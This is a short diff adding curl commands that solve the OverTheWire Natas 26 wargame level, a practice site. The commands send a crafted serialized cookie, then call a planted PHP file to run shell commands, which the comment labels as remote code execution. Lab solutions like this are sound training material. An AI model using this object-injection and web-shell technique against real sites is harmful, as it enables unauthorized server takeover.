@@ -1,0 +1,6 @@
+curl -u natas26:$(cat natas26) 'http://natas26.natas.labs.overthewire.org' -H "Cookie: drawing=$(php makeload.php)"
+
+// first store cookie to use on "cookie.txt"
+curl -u natas26:$(cat natas26) -c cookie.txt 'http://natas26.natas.labs.overthewire.org'
+// RCE mimimi
+curl -u natas26:$(cat natas26) -b cookie.txt 'http://natas26.natas.labs.overthewire.org/img/mimimi.php?par=ls'
